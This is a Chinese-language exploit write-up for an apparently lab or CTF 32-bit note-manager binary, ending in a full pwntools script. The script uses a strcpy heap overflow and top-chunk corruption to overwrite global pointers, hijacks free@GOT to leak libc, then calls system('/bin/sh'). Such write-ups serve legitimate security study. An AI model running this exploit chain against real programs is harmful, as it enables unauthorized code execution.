# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析：
- **程序类型**: 32位ELF二进制程序，使用堆管理功能。通过`file`命令可确认为32位可执行文件。
- **安全机制**:
  - 栈保护（Stack Canary）启用，代码中使用`__readgsdword(0x14u)`进行栈保护检查。
  - NX（No-Execute）启用，堆栈不可执行，防止shellcode执行。
  - 无PIE（Position Independent Executable），代码段和數據段地址固定（如0x8048000），便于利用。
  - Partial RELRO，GOT表可写，允许劫持GOT条目。
- **依赖库**: 依赖libc，具体版本通过泄漏的地址确定（如libc-2.23等）。使用`ldd`可查看动态链接库。
- **运行需求**: Linux环境，需要相应的libc库。程序通过菜单驱动，提供笔记管理功能（创建、编辑、删除、同步）。

## 漏洞成因
程序存在堆溢出漏洞，具体分析如下：
- **关键函数**: 
  - `sub_80487A1`（名字输入）和`sub_804884E`（Org/Host输入）中，使用`strcpy`将用户输入复制到堆缓冲区，但堆缓冲区通过`malloc(0x40u)`分配64字节，而`sub_804868D`允许输入最多64字节，加上null终止符，导致溢出1字节。由于堆布局，溢出会破坏相邻堆块的元数据（如size字段）。
  - 反编译代码显示，`strcpy`在复制时未检查长度，直接复制到固定大小的堆缓冲区，造成溢出。
- **关键结构体**: 
  - 堆块元数据（如prev_size、size），位于堆块开头。
  - 全局变量数组：笔记指针数组（0x804B120）、笔记大小数组（0x804B0A0）、标志数组（0x804B0E0），用于管理笔记。
- **漏洞类型**: 堆溢出（Heap Overflow），导致堆元数据破坏和全局变量覆盖，进而实现任意地址读写。结合程序功能（如编辑、删除笔记），可触发利用链。

## 漏洞利用过程
利用过程通过exp脚本步进执行，关键内存变化如下表所示：

| 步骤 | 操作描述 | 内存变化 | 利用目的 |
|------|----------|----------|----------|
| 1 | 输入名字（64字节'a'） | 堆溢出破坏堆元数据；泄漏堆地址（0x8b51008） | 获取堆基地址，绕过ASLR |
| 2 | 输入Org（64字节'b'）和Host（0xffffffff + 'c'） | 进一步破坏堆元数据；设置top chunk size为0xffffffff | 控制堆分配，使堆扩展到数据段 |
| 3 | 分配大型笔记（size = margin - 20） | 堆扩展，top chunk移动到数据段0x804b238；分配笔记0 | 实现任意地址分配，覆盖全局变量 |
| 4 | 分配多个0x40字节笔记（笔记1-4） | 填充堆布局；笔记指针数组部分被覆盖 | 准备任意读写目标，建立利用基础 |
| 5 | 编辑笔记1，写入指针数据 | 覆盖笔记指针数组为[0x804b120, 0x804b120, free_got, printf_got] | 建立任意读写能力，指向GOT表 |
| 6 | 编辑笔记2，写入puts_plt | 修改free@got.plt为puts@plt（0x8048520） | 劫持free函数为puts，用于泄漏libc地址 |
| 7 | 删除笔记3 | 触发free（实际执行puts），泄漏printf地址（0xf7d7c680） | 计算libc基地址（libc.address = printf_addr - libc.sym['printf']） |
| 8 | 计算libc基地址 | libc映射到0xf7d33000；获取system地址（0xf7d6ddb0） | 为GOT劫持准备system函数地址 |
| 9 | 编辑笔记1，写入新指针和"/bin/sh" | 更新笔记指针数组为[0x804b130, 0x804b130, free_got, free_got]；在0x804b130写入"/bin/sh" | 准备system参数，确保free被调用时执行system("/bin/sh") |
| 10 | 编辑笔记2，写入system地址 | 修改free@got.plt为system（0xf7d6ddb0） | 完全劫持free函数为system |
| 11 | 删除笔记0 | 触发free（实际执行system("/bin/sh")） | 获得shell，进程切换到/bin/dash |

**内存变化总结**:
- **初始状态**: 堆布局正常，GOT表原始，全局变量未初始化。
- **利用后状态**: 堆元数据腐败，top chunk移动至数据段，GOT表被劫持（free指向system），全局变量覆盖，"/bin/sh"字符串写入数据段。
- **最终状态**: 程序执行system("/bin/sh")，启动交互式shell，内存重新映射为64位环境。

## Exploit
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample20')
p = process('./data/sample20')
free_got = elf.got['free']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
libc = elf.libc  # 使用本地libc，或通过LibcSearcher远程查找

def new_note(size, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'1')
    io.sendlineafter(b'Input the length of the note content:\n', str(size).encode())
    io.sendlineafter(b'Input the content:\n', content)
    io.recvline()

def edit_note(idx, content, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'3')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())
    io.sendlineafter(b'Input the new content:\n', content)
    io.recvline()

def del_note(idx, io:tube=p):
    io.sendlineafter(b'option--->>\n', b'4')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())

# Step 1: 通过堆溢出泄漏堆地址
p.sendafter(b'Input your name:\n', b'a' * 0x40)  # 溢出堆缓冲区，破坏元数据
p.recvuntil(b'a' * 0x40)
leak_heap_addr = u32(p.recvn(4))  # 泄漏堆地址，用于后续计算

# Step 2: 破坏top chunk，控制堆分配
p.sendafter(b'Org:\n', b'b' * 0x40)  # 溢出Org堆块
p.sendafter(b'Host:\n', p32(0xffffffff) + (0x40 - 4) * b'c')  # 设置top chunk size为0xffffffff
p.recvuntil(b'OKay! Enjoy:)\n')

# Step 3: 分配大型笔记，扩展堆到数据段
top_chunk_addr = leak_heap_addr + 0xd0  # 计算top chunk地址
ptr_array = 0x804b120  # 全局笔记指针数组地址
margin = ptr_array - top_chunk_addr  # 计算分配大小，使堆覆盖数据段
new_note(margin - 20, "")  # 分配笔记0，触发堆扩展

# Step 4: 分配多个笔记，填充堆布局
new_note(0x40, b'aa')  # 笔记1
new_note(0x40, b'aa')  # 笔记2
new_note(0x40, b'aa')  # 笔记3
new_note(0x40, b'aa')  # 笔记4

# Step 5: 覆盖笔记指针数组，建立任意读写
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))  # 使笔记指针指向自身和GOT

# Step 6: 劫持free@got.plt为puts@plt，用于泄漏libc
edit_note(2, p32(puts_plt))  # 修改free GOT条目为puts

# Step 7: 触发free（实际执行puts），泄漏libc地址
del_note(3)  # 删除笔记3，调用free，实际执行puts(printf_got)
msg = p.recvuntil(b'Delete success.\n')
printf_addr = u32(msg[:4])  # 泄漏printf地址
libc.address = printf_addr - libc.sym['printf']  # 计算libc基地址

# Step 8: 更新指针并写入"/bin/sh"字符串
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')  # 准备system参数

# Step 9: 劫持free@got.plt为system
edit_note(2, p32(libc.sym['system']))  # 修改free GOT条目为system

# Step 10: 触发system("/bin/sh")获得shell
del_note(0)  # 删除笔记0，调用free，实际执行system("/bin/sh")

p.interactive()  # 进入交互式shell
```

**Exp注释说明**:
- **关键函数**: `new_note`, `edit_note`, `del_note` 封装了程序功能，用于操作笔记。
- **地址计算**: 通过泄漏的堆地址和固定地址（如GOT、全局变量）计算偏移，实现任意地址读写。
- **利用链**: 结合堆溢出、GOT劫持和libc泄漏，最终执行system获得shell。
- **适应性**: 使用`LibcSearcher`可适应不同libc版本，确保远程利用成功。
